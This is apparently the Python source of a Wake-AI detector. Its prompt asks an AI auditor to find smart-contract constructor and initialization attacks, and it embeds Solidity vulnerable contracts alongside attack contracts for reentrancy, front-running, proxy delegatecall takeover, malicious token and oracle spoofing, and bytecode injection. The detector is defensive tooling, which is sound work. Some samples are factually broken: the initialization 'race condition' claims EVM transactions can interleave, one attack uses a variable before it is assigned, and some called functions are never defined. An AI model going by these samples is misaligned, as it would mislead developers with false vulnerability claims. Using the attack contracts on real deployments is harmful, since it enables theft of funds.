"""Constructor/Initialization Attack Vectors detector for Wake-AI framework."""

from wake_ai import workflow
from wake_ai.templates import SimpleDetector


@workflow.command(name="constructor-initialization-attacks")
def factory():
    """Run constructor/initialization attack vectors detector."""
    return ConstructorInitializationAttacksDetector()


class ConstructorInitializationAttacksDetector(SimpleDetector):
    """Advanced detector for Constructor and Initialization attack vectors."""

    def get_detector_prompt(self) -> str:
        """Define the constructor/initialization attack detection workflow."""
        return """# Constructor/Initialization Attack Vectors Analysis

## Task
Perform comprehensive analysis of 2 high-severity attack vectors targeting smart contract constructor functions and initialization processes, focusing on constructor exploitation and advanced initialization attacks.

## Target Attack Vectors (All High Severity)

### 🟡 High Severity (2 vectors)
1. **Constructor Initialization Attack**
   - Constructor parameter manipulation
   - Initialization state corruption
   - Constructor reentrancy attacks
   - Deployment front-running
   - Constructor logic bypasses

2. **Enhanced Initialization Attack**
   - Multi-stage initialization exploitation
   - Proxy initialization attacks
   - Initializer function bypasses
   - Cross-contract initialization manipulation
   - Initialization race conditions

## Analysis Process

### 1. Discovery Phase
- Map constructor functions
- Identify initialization patterns
- Locate proxy initialization logic
- Find multi-stage init processes
- Analyze initialization dependencies

### 2. Attack Vector Analysis

#### Constructor Vulnerabilities
- Check constructor parameter validation
- Analyze constructor state setup
- Look for constructor reentrancy risks
- Test deployment manipulation
- Verify initialization completeness

#### Initialization Process Attacks
- Map initialization sequences
- Check initializer function security
- Look for initialization gaps
- Test race condition scenarios
- Verify initialization guards

#### Proxy Pattern Exploitation
- Check proxy initialization logic
- Analyze implementation switches
- Look for initialization bypasses
- Test storage collision risks
- Verify upgrade mechanisms

#### Cross-Contract Dependencies
- Check initialization ordering
- Analyze external dependencies
- Look for circular dependencies
- Test initialization failures
- Verify fallback mechanisms

### 3. Initialization-Specific Exploit Patterns

#### Constructor Reentrancy
- External calls in constructor
- State corruption during deployment
- Constructor callback attacks
- Deployment-time manipulation
- Contract creation exploits

#### Initialization Front-Running
- Deployment transaction front-running
- Initialization parameter hijacking
- Constructor parameter manipulation
- Deployment MEV extraction
- Contract creation sniping

#### Proxy Initialization Attacks
- Uninitialized proxy exploitation
- Implementation initialization bypasses
- Storage layout corruption
- Initialization function hijacking
- Upgrade process manipulation

## Documentation Requirements

For each initialization attack:
- **Attack Type**: Constructor or initialization category
- **Target Phase**: Deployment or initialization stage
- **Manipulation Method**: How initialization is corrupted
- **State Impact**: Effect on contract state
- **Timing Requirements**: Attack window constraints
- **Prevention Mechanisms**: Secure initialization patterns
- **Recovery Options**: Post-attack remediation

## Validation Criteria
- Test during actual deployment scenarios
- Consider gas limit constraints
- Verify timing attack feasibility
- Account for network conditions
- Provide initialization security patterns

## Special Focus Areas

### Constructor Initialization Attack
```solidity
// Vulnerable constructor patterns:
contract VulnerableConstructor {
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balances;
    
    // Vulnerable constructor with external calls
    constructor(address _token, uint256 _initialSupply) {
        owner = msg.sender;
        totalSupply = _initialSupply;
        
        // VULNERABLE: External call in constructor
        IERC20(_token).transferFrom(msg.sender, address(this), _initialSupply);
        
        // State can be corrupted if transferFrom triggers reentrancy
        balances[msg.sender] = _initialSupply;
        
        // VULNERABLE: No validation of parameters
        // Attacker can pass malicious token contract
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        require(balances[owner] > 0, "No balance");
        
        // If constructor was exploited, owner might be manipulated
        payable(owner).transfer(address(this).balance);
    }
}

// Constructor reentrancy attack:
contract ConstructorAttack {
    VulnerableConstructor public target;
    
    function attack() external {
        // Deploy with malicious token that triggers reentrancy
        target = new VulnerableConstructor(address(this), 1000000e18);
    }
    
    // This gets called during constructor execution
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // Reenter during constructor to corrupt state
        target.withdraw(); // This might work if owner was set first
        return true;
    }
}
```

### Deployment Front-Running Attack
```solidity
// Deployment front-running vulnerability:
contract DeploymentFrontrun {
    address public factory;
    address public owner;
    bool public initialized;
    
    constructor() {
        // VULNERABLE: No immediate initialization
        factory = msg.sender;
    }
    
    function initialize(address _owner, bytes calldata _data) external {
        require(!initialized, "Already initialized");
        require(msg.sender == factory, "Only factory");
        
        owner = _owner;
        initialized = true;
        
        // Execute initialization data
        (bool success,) = address(this).call(_data);
        require(success, "Initialization failed");
    }
}

// Front-running attack:
contract FrontrunAttack {
    function deployAndFrontrun(bytes calldata creationCode, bytes calldata initData) external {
        // Step 1: Monitor mempool for contract deployments
        // Step 2: Calculate contract address using CREATE2 or nonce
        address predictedAddress = computeAddress(creationCode);
        
        // Step 3: Front-run the initialize call
        DeploymentFrontrun(predictedAddress).initialize(address(this), initData);
        
        // Attacker becomes owner instead of legitimate deployer
    }
}
```

### Enhanced Initialization Attack
```solidity
// Complex initialization vulnerability:
contract EnhancedInitialization {
    address public admin;
    address public implementation;
    bool public stage1Complete;
    bool public stage2Complete;
    bool public fullyInitialized;
    
    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }
    
    // Stage 1: Basic setup
    function initializeStage1(address _admin) external {
        require(!stage1Complete, "Stage 1 already complete");
        require(_admin != address(0), "Invalid admin");
        
        admin = _admin;
        stage1Complete = true;
    }
    
    // Stage 2: Advanced setup
    function initializeStage2(address _implementation) external onlyAdmin {
        require(stage1Complete, "Stage 1 not complete");
        require(!stage2Complete, "Stage 2 already complete");
        
        implementation = _implementation;
        stage2Complete = true;
    }
    
    // Final initialization
    function finalizeInitialization() external onlyAdmin {
        require(stage2Complete, "Stage 2 not complete");
        require(!fullyInitialized, "Already initialized");
        
        fullyInitialized = true;
        
        // VULNERABLE: External call during initialization
        IImplementation(implementation).setup();
    }
    
    function criticalFunction() external {
        require(fullyInitialized, "Not initialized");
        // Critical functionality that depends on proper initialization
    }
}

// Multi-stage initialization attack:
contract InitializationAttack {
    function exploitInitialization() external {
        EnhancedInitialization target = new EnhancedInitialization();
        
        // Step 1: Complete stage 1 legitimately
        target.initializeStage1(address(this));
        
        // Step 2: Set malicious implementation
        target.initializeStage2(address(new MaliciousImplementation()));
        
        // Step 3: Trigger malicious setup during finalization
        target.finalizeInitialization();
        
        // Step 4: Contract is now compromised but appears initialized
        target.criticalFunction(); // Executes with corrupted state
    }
}

contract MaliciousImplementation {
    function setup() external {
        // Corrupt the calling contract's state
        EnhancedInitialization(msg.sender).changeAdmin(address(this));
    }
}
```

### Proxy Initialization Attack
```solidity
// Vulnerable proxy initialization:
contract VulnerableProxy {
    address public implementation;
    bool public initialized;
    
    function initialize(address _implementation, bytes calldata _data) external {
        require(!initialized, "Already initialized");
        
        implementation = _implementation;
        initialized = true;
        
        // VULNERABLE: Delegate call during initialization
        (bool success,) = implementation.delegatecall(_data);
        require(success, "Initialization failed");
    }
    
    fallback() external payable {
        require(initialized, "Not initialized");
        
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// Proxy initialization attack:
contract ProxyAttack {
    function exploitProxy() external {
        VulnerableProxy proxy = new VulnerableProxy();
        
        // Deploy malicious implementation
        MaliciousImpl maliciousImpl = new MaliciousImpl();
        
        // Initialize with malicious data
        bytes memory maliciousData = abi.encodeWithSignature(
            "maliciousInit(address)", 
            address(this)
        );
        
        proxy.initialize(address(maliciousImpl), maliciousData);
        
        // Proxy is now controlled by attacker
    }
}

contract MaliciousImpl {
    address public owner;
    
    function maliciousInit(address _owner) external {
        // This executes in proxy's context via delegatecall
        // Overwrites proxy's storage
        owner = _owner;
        
        // Can manipulate any storage slot
        assembly {
            sstore(0, _owner) // Overwrite implementation slot
            sstore(1, 1)      // Set initialized to true
        }
    }
}
```

### Initialization Race Condition
```solidity
// Race condition in initialization:
contract RaceConditionInit {
    address public owner;
    uint256 public value;
    bool public initialized;
    
    function initialize(address _owner, uint256 _value) external {
        // VULNERABLE: No atomic check-and-set
        require(!initialized, "Already initialized");
        
        owner = _owner;
        value = _value;
        
        // Gap between checks and state update
        // Multiple transactions can pass the require check
        initialized = true;
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

// Race condition attack:
contract RaceAttack {
    function exploitRace(address target) external {
        // Send multiple initialize transactions simultaneously
        // Last one to execute becomes the owner
        
        for (uint i = 0; i < 10; i++) {
            try RaceConditionInit(target).initialize(address(this), i) {
                // One of these will succeed and set us as owner
                break;
            } catch {
                // Continue trying
                continue;
            }
        }
    }
}
```

### Cross-Contract Initialization Attack
```solidity
// Cross-contract initialization vulnerability:
contract CrossContractInit {
    address public partner;
    address public admin;
    bool public initialized;
    
    function initialize(address _partner, address _admin) external {
        require(!initialized, "Already initialized");
        
        partner = _partner;
        admin = _admin;
        
        // VULNERABLE: Depends on external contract state
        require(IPartner(partner).isInitialized(), "Partner not ready");
        
        initialized = true;
    }
    
    function criticalOperation() external {
        require(initialized, "Not initialized");
        require(IPartner(partner).validateOperation(msg.sender), "Invalid");
        
        // Critical operation
    }
}

// Cross-contract attack:
contract CrossContractAttack {
    bool public isInitialized = true;
    
    function validateOperation(address user) external returns (bool) {
        // Always validate attacker
        return user == tx.origin;
    }
    
    function attack() external {
        // Deploy target with this contract as partner
        CrossContractInit target = new CrossContractInit();
        target.initialize(address(this), address(this));
        
        // Target is initialized with malicious partner
        target.criticalOperation(); // Will pass validation
    }
}
```

### Initialization Parameter Validation
```solidity
// Parameter validation failures:
contract WeakParameterValidation {
    address public token;
    address public oracle;
    uint256 public threshold;
    bool public initialized;
    
    function initialize(
        address _token,
        address _oracle,
        uint256 _threshold
    ) external {
        require(!initialized, "Already initialized");
        
        // VULNERABLE: Weak parameter validation
        require(_token != address(0), "Invalid token");
        require(_oracle != address(0), "Invalid oracle");
        require(_threshold > 0, "Invalid threshold");
        
        token = _token;
        oracle = _oracle;
        threshold = _threshold;
        initialized = true;
    }
    
    function performAction() external {
        uint256 price = IOracle(oracle).getPrice(token);
        require(price > threshold, "Price too low");
        
        // Action based on price
        IERC20(token).transfer(msg.sender, 1000e18);
    }
}

// Parameter manipulation attack:
contract ParameterAttack {
    function attack() external {
        WeakParameterValidation target = new WeakParameterValidation();
        
        // Initialize with malicious contracts
        target.initialize(
            address(new MaliciousToken()),
            address(new MaliciousOracle()),
            1 // Very low threshold
        );
        
        // Can now exploit the target
        target.performAction();
    }
}

contract MaliciousToken {
    function transfer(address to, uint256 amount) external returns (bool) {
        // Don't actually transfer, just return true
        return true;
    }
    
    function balanceOf(address) external pure returns (uint256) {
        return type(uint256).max;
    }
}

contract MaliciousOracle {
    function getPrice(address) external pure returns (uint256) {
        // Always return high price
        return type(uint256).max;
    }
}
```

### Constructor Bytecode Manipulation
```solidity
// Constructor bytecode attack:
contract BytecodeManipulation {
    address public factory;
    bool public isLegitimate;
    
    constructor(bytes memory _proof) {
        factory = msg.sender;
        
        // VULNERABLE: Executing arbitrary bytecode in constructor
        assembly {
            let size := mload(_proof)
            let code := add(_proof, 0x20)
            
            // Execute proof bytecode
            let success := call(gas(), address(), 0, code, size, 0, 0)
            
            if iszero(success) {
                revert(0, 0)
            }
        }
        
        isLegitimate = true;
    }
}

// Bytecode attack:
contract BytecodeAttack {
    function attack() external {
        // Craft malicious bytecode that corrupts contract state
        bytes memory maliciousBytecode = hex"608060405234801561001057600080fd5b50";
        
        // Deploy with malicious constructor bytecode
        BytecodeManipulation target = new BytecodeManipulation(maliciousBytecode);
        
        // Contract state may be corrupted during construction
    }
}
```

Focus on identifying vulnerabilities in smart contract deployment and initialization phases, including constructor reentrancy, initialization race conditions, proxy initialization attacks, parameter validation failures, and multi-stage initialization exploits. Pay special attention to the timing-sensitive nature of these attacks and the permanent impact they can have on contract security."""